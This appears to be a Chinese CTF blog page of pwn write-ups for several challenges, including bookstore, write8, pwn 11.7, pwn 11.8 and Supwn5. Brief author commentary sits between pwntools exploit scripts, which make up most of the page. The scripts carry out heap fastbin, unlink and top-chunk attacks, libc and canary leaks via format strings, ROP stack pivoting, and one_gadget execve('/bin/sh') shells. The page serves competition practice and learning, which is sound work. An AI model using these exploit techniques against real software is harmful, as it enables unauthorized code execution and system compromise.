&quot;debug&quot;</span><br><span class="line">def new(auname,size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,auname)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;0&#x27;)</span><br><span class="line">new(&#x27;1&#x27;,0,&#x27;1&#x27;)</span><br><span class="line">new(&#x27;2&#x27;,0,&#x27;2&#x27;)</span><br><span class="line">new(&#x27;3&#x27;,0,&#x27;3&#x27;)</span><br><span class="line">new(&#x27;4&#x27;,0,&#x27;4&#x27;)</span><br><span class="line">new(&#x27;5&#x27;,0,&#x27;5&#x27;)</span><br><span class="line">new(&#x27;6&#x27;,0,&#x27;6&#x27;)</span><br><span class="line">new(&#x27;7&#x27;,0,&#x27;7&#x27;)</span><br><span class="line">new(&#x27;8&#x27;,0,&#x27;8&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">pay = p64(0)*3+p64(0xa1)</span><br><span class="line">new(&#x27;0&#x27;,0,pay)</span><br><span class="line">free(6)</span><br><span class="line">pay = p64(0)*2+p64(0xa0)+p64(0x21)</span><br><span class="line">new(&#x27;0&#x27;,0,pay)</span><br><span class="line">free(1)</span><br><span class="line">new(&#x27;0&#x27;,10,&#x27;1&#x27;*8)</span><br><span class="line">show(1)</span><br><span class="line">p.recvuntil(&#x27;1&#x27;*8)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak-0x3c4c08</span><br><span class="line">print hex(libc_base)</span><br><span class="line">new(&#x27;0&#x27;,10,&#x27;9&#x27;*8)</span><br><span class="line">free(4)</span><br><span class="line">free(9)</span><br><span class="line">show(2)</span><br><span class="line">p.recvuntil(&#x27;Bookname:&#x27;)</span><br><span class="line">heap = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">heap_base = heap-0x80</span><br><span class="line"></span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line">new(&#x27;0&#x27;,0x50,&#x27;4&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x40,&#x27;9&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;a&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x40,&#x27;b&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;c&#x27;)</span><br><span class="line">new(&#x27;0&#x27;,0x10,&#x27;d&#x27;)</span><br><span class="line">free(7)</span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;0&#x27;)</span><br><span class="line">## 8 b</span><br><span class="line">free(11)</span><br><span class="line">free(9)</span><br><span class="line">mall = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]-0x23</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">print hex(mall)</span><br><span class="line">free(8)</span><br><span class="line">new(&#x27;0&#x27;,0,&#x27;c&#x27;*10)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>全在这 wp 里了,哭了~~~ 发现 unlink 也不行,不能 edit ,很恶心~~~ 就完成了 unlink 到 bss 端,但是无法利用~~~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,p64(elf.got[&#x27;free&#x27;])*3)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0,&#x27;0&#x27;)</span><br><span class="line">new(0x30,&#x27;1&#x27;)</span><br><span class="line">new(0x40,&#x27;2&#x27;)</span><br><span class="line">new(0x30,&#x27;3&#x27;)</span><br><span class="line">new(0x40,&#x27;4&#x27;)</span><br><span class="line">new(0,&#x27;5&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">pay = p64(0)*3+p64(0x91)+p64(0)+p64(0x81)+p64(0x602080+0x10)+p64(0x602080+0x18)</span><br><span class="line">pay = pay.ljust(0xa0,&#x27;\x00&#x27;)+p64(0x80)+p64(0x90)</span><br><span class="line">new(0,pay)</span><br><span class="line">free(3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bookstore&#x27;)</span><br><span class="line">elf = ELF(&quot;./bookstore&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size,boname):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;What is the author name?\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;How long is the book name?\n&#x27;,str(size))</span><br><span class="line">	p.sendlineafter(&#x27;What is the name of the book?\n&#x27;,boname)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Which book do you want to sell?&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0,&#x27;0&#x27;)</span><br><span class="line">new(0x50,&#x27;1&#x27;)</span><br><span class="line">new(0x50,&#x27;2&#x27;)</span><br><span class="line">new(0x50,&#x27;3&#x27;)</span><br><span class="line">new(0,&#x27;4&#x27;)</span><br><span class="line">new(0x50,&#x27;5&#x27;)</span><br><span class="line">new(0,&#x27;6&#x27;)</span><br><span class="line">new(0x40,&#x27;7&#x27;)</span><br><span class="line">new(0,&#x27;8&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">new(0,p64(0)*3+p64(0xc1))</span><br><span class="line">free(1)</span><br><span class="line">new(0,&#x27;a&#x27;*8)</span><br><span class="line">show(1)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*8)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak - 3951656</span><br><span class="line">one = base+ 0x4526a</span><br><span class="line">free(6)</span><br><span class="line">free(7)</span><br><span class="line">new(0,p64(0x6)*3+p64(0x51)+p64(0x61))</span><br><span class="line">new(0x40,&#x27;7&#x27;)</span><br><span class="line">free(4)</span><br><span class="line">free(5)</span><br><span class="line">new(0,p64(0x0)*3+p64(0x61)+p64(leak-184-56))</span><br><span class="line">new(0x50,&#x27;5&#x27;)</span><br><span class="line">new(0x50,p64(0x0)*6+p64(leak-184-56-64))</span><br><span class="line">new(0x50,&#x27;123&#x27;)</span><br><span class="line">new(0x50,p64(0)+p64(one))</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;xxxx&#x27;)</span><br><span class="line">p.sendline(&#x27;30&#x27;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>学到了好多,这个比较粗糙,但还是要认真记录一下,首先这个思路就太狠了,和之前做过的一道题贼像,这个是把 top_chunk 给改了,而且手法好骚啊</p>
<p><code>new(0,p64(0x6)*3+p64(0x51)+p64(0x61))</code> 先把比目标 bin 小 0x10 个字节的给改了,这样伪造为之后的 malloc 提供方便</p>
<h2 id="吉林省网络安全大赛-write8"><a href="#吉林省网络安全大赛-write8" class="headerlink" title="吉林省网络安全大赛 write8"></a>吉林省网络安全大赛 write8</h2><p>比赛的时候刚接触 pwn ,洞都没看,就直接放了,现在突然看到了,做一下,发现不难 orz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">p=process(&#x27;./write8&#x27;,aslr=2)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&#x27;name?\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*16)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*16)</span><br><span class="line">leak = u32(p.recvuntil(&#x27;write&#x27;)[:4].ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">leak_real=leak-66</span><br><span class="line">p.recvuntil(&#x27;Tell me where is your favorite\n&#x27;)</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">main_addr=0x080485F6</span><br><span class="line">p.send(p32(main_addr))</span><br><span class="line"></span><br><span class="line">p.send(&#x27;a&#x27;*28)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*28)</span><br><span class="line">libc_base = u32(p.recvuntil(&#x27;write&#x27;)[:4])-377150</span><br><span class="line">print hex(libc_base)</span><br><span class="line">leak_real=leak-210</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">#gdb.attach(p,&#x27;b*0x80485EB&#x27;)</span><br><span class="line">one = 0x5fbc6 + libc_base</span><br><span class="line">p.send(p32(one)+p32(0))</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的漏洞就是一个任意地址写,思路还是很清楚的,就是覆盖返回地址,上述 wp 的思路就是</p>
<ul>
<li>main 第一次泄漏 stack</li>
<li>write8 直接往 ret 里放 main_addr ,因为泄漏一个远远不够</li>
<li>到 main_addr 后泄漏 libc_base</li>
<li>到 write8 后 ret 放 one_gadget ,这里用了一个骚思路(这里我们只能控制 8 个字节</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pic$ one_gadget /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0x3ac5c execve(&quot;/bin/sh&quot;, esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac5e execve(&quot;/bin/sh&quot;, esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac62 execve(&quot;/bin/sh&quot;, esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac69 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc5 execl(&quot;/bin/sh&quot;, eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc6 execl(&quot;/bin/sh&quot;, [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br></pre></td></tr></table></figure>

<p>最后一个刚刚好,直接暴力填入 0 完事, one_gadget 绝对成立~~~~ 巧了不是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">#p=process(&#x27;./write8&#x27;,aslr=2)</span><br><span class="line">p=process(&#x27;./write8&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&#x27;name?\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*16)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*16)</span><br><span class="line">leak = u32(p.recvuntil(&#x27;write&#x27;)[:4].ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">print hex(leak)</span><br><span class="line">leak_real=leak-66</span><br><span class="line">p.recvuntil(&#x27;Tell me where is your favorite\n&#x27;)</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">main_addr=0x080485F6</span><br><span class="line">p.send(p32(main_addr))</span><br><span class="line"></span><br><span class="line">p.send(&#x27;a&#x27;*28)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*28)</span><br><span class="line">libc_base = u32(p.recvuntil(&#x27;write&#x27;)[:4])-377150</span><br><span class="line">print hex(libc_base)</span><br><span class="line">leak_real=leak-210</span><br><span class="line">p.sendline(hex(leak_real)[2:])</span><br><span class="line">sleep(0.1)</span><br><span class="line">gdb.attach(p,&#x27;b*0x80485EB&#x27;)</span><br><span class="line">one = 0x5f066 + libc_base+0xb10</span><br><span class="line">p.send(p32(one)+p32(0))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>上述为题目环境,差了 0xb10 个字节,还好	官方是一个栈迁移,我看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">debug = 1</span><br><span class="line">arch_64 = 0</span><br><span class="line">exe = &quot;./write8&quot;</span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">rud = lambda x:p.recvuntil(x,drop=True)</span><br><span class="line">sd = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sea = lambda x:p.sendafter(x)</span><br><span class="line">sela = lambda x:p.sendlineafter(x)</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">e = ELF(exe)</span><br><span class="line">if debug:</span><br><span class="line">	context.log_level = &quot;debug&quot;</span><br><span class="line">def rl():</span><br><span class="line">	p.recvline()</span><br><span class="line">if len(sys.argv)&gt;1:</span><br><span class="line">	p = remote(sys.argv[1],int(sys.argv[2]))</span><br><span class="line">	libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">	p = process([exe])</span><br><span class="line">if arch_64:</span><br><span class="line">	libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	arena = 0x3c4b20</span><br><span class="line">	context.arch = &quot;amd64&quot;</span><br><span class="line">else:</span><br><span class="line">	libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	arena = 0x1b2780</span><br><span class="line">	context.arch = &quot;i386&quot;</span><br><span class="line">def csu(offset,end,front,fun_got,arg1,arg2,arg3):</span><br><span class="line">	tmp = flat([&quot;A&quot;*offset,end,0,1,fun_got,arg3,arg2,arg1,front,&quot;A&quot;*0x38,vul])</span><br><span class="line">	return tmp</span><br><span class="line">def z():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">def write(addr,data):</span><br><span class="line">	print &quot;writing &quot;+hex(addr)+&quot; : &quot;+data</span><br><span class="line">	ru(&quot;favorite\n&quot;)</span><br><span class="line">	sl(hex(addr)[2:])</span><br><span class="line">	rl()</span><br><span class="line">	sd(data)</span><br><span class="line">main = e.symbols[&quot;main&quot;]</span><br><span class="line">puts_plt = e.plt[&quot;puts&quot;]</span><br><span class="line">puts_got = e.got[&quot;puts&quot;]</span><br><span class="line">p1=flat([puts_plt,main,puts_got])</span><br><span class="line">p1+=&quot;A&quot;*0x8</span><br><span class="line">rl()</span><br><span class="line">sd(p1)</span><br><span class="line">ru(&quot;A&quot;*0x8)</span><br><span class="line">stack = u32(r(4))</span><br><span class="line">print &quot;stack: &quot;+hex(stack)</span><br><span class="line">ret = stack - 0x140</span><br><span class="line">rop_addr = stack - 0x140</span><br><span class="line">leave_ret = 0x080484e8</span><br><span class="line">p2 = p32(rop_addr)+p32(leave_ret)</span><br><span class="line">write(ret-4,p2)</span><br><span class="line">ru(&quot;\n&quot;)</span><br><span class="line">puts = u32(r(4))</span><br><span class="line">print &quot;puts: &quot;+hex(puts)</span><br><span class="line">libc.address = puts - libc.symbols[&quot;puts&quot;]</span><br><span class="line">sys = libc.symbols[&quot;system&quot;]</span><br><span class="line">one = libc.address + 0x3ac69</span><br><span class="line">rop2_addr = stack - 0x1cc</span><br><span class="line">new_ret = stack-0x1d0</span><br><span class="line">bin_sh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">print hex(bin_sh)</span><br><span class="line">p3 = flat([sys,bin_sh,bin_sh])</span><br><span class="line">ru(&quot;name?\n&quot;)</span><br><span class="line">sd(p3)</span><br><span class="line">p4 = flat([rop2_addr,leave_ret])</span><br><span class="line">pause()</span><br><span class="line">write(new_ret,p3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我好像有点太依赖 one_gadget 了,还得在整整 rop ~~~ 而且官方的 wp 也想用 one ,不过失败了, 23333~~~</p>
<p>官方的 wp 就很秀了,这个用 puts 泄漏的 libc_base 比较优雅,很通用,而且最后起 shell ,也是用 so 的 sh 还是很容易理解的</p>
<h2 id="pwn-11-7"><a href="#pwn-11-7" class="headerlink" title="pwn 11.7"></a>pwn 11.7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">pay = &#x27;a&#x27;*136+p64(0x40061A)+p64(0)+p64(1)+p64(elf.got[&#x27;write&#x27;])+p64(8)+p64(elf.got[&#x27;write&#x27;])+p64(1)+p64(0x400600)+p64(0)*7+p64(0x0400566)</span><br><span class="line">p.recvuntil(&#x27;0123&#x27;)</span><br><span class="line">p.send(pay)</span><br><span class="line">write = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(write)</span><br><span class="line">base=write-libc.sym[&quot;write&quot;]</span><br><span class="line">print hex(base)</span><br><span class="line">one = base+0x4526a</span><br><span class="line">pay = &#x27;a&#x27;*136+p64(one)+p64(0)*10</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">一个 one_gadget 必定通杀</span><br><span class="line"></span><br><span class="line">## pwn 11.8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>p&#x3D; process(‘pwn1’)<br>elf &#x3D; ELF(“.&#x2F;pwn1”, checksec&#x3D;False)<br>libc &#x3D; elf.libc<br>#context.log_level &#x3D; “debug”<br>p.sendline(“%2$p.%35$p”)</p>
<h1 id="leak-canary-and-libc-addr"><a href="#leak-canary-and-libc-addr" class="headerlink" title="leak canary and libc_addr"></a>leak canary and libc_addr</h1><p>p.recvuntil(“0x”)<br>addr_offset &#x3D; int(p.recvuntil(“.0x”)[:-3],16)<br>canary &#x3D; int(p.recvuntil(‘,’)[:-1],16)<br>libc_base &#x3D; addr_offset - 1783920<br>one &#x3D; libc_base+0x5fbc6<br>p.recvuntil(‘messages:’)<br>payload &#x3D; ‘\x00’*0x64+p32(canary)+p32(0)<em>3+p32(one)<br>#gdb.attach(p,’b</em>0x80485FA ‘)</p>
<p>p.sendline(payload)<br>#pause()<br>p.interactive()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">有点问题,但还好解决了,就是简单的格式化字符串加栈溢出,用 ida 看偏移有点不准,得自己用 gdb 调试出结果</span><br><span class="line"></span><br><span class="line">## Supwn5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>p &#x3D; process(‘.&#x2F;supwn5’,aslr&#x3D;0)<br>elf &#x3D; ELF(“.&#x2F;supwn5”, checksec&#x3D;False)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’, checksec&#x3D;False)<br>#context.log_level &#x3D; “debug”<br>def new(size):<br>	p.sendlineafter(‘please chooice :\n’,’1’)<br>	p.sendlineafter(‘please input the size : \n’,str(size))<br>def free(ind):<br>	p.sendlineafter(‘please chooice :\n’,’2’)<br>	p.sendlineafter(‘which node do you want to delete\n’,str(ind))<br>def edit(ind,content):<br>	p.sendlineafter(‘please chooice :\n’,’4’)<br>	p.sendlineafter(‘which one do you want modify :\n’,str(ind))<br>	p.sendafter(‘please input the content’,content)<br>def show(ind):<br>	p.sendlineafter(‘please chooice :\n’,’3’)<br>	p.sendlineafter(‘which node do you want to show\n’,str(ind))</p>
<p>new(0x80)<br>new(1)<br>free(0)<br>new(0x80)<br>show(0)<br>p.recvuntil(‘the content is : \n’)<br>leak &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,”\x00”))<br>print hex(leak)<br>base &#x3D; leak-3951480<br>free_hook&#x3D;base+libc.symbols[‘__free_hook’]<br>one &#x3D; base+0xf1147<br>new(0x40)</p>
<p>free(2)<br>edit(1,p64(0)*3+p64(0x51)+p64(0x61))<br>new(0x40)<br>new(0x50)<br>free(3)<br>edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))<br>new(0x50)<br>new(0x50)<br>edit(4,p64(0)*6+p64(leak-0x80))</p>
<p>new(1)</p>
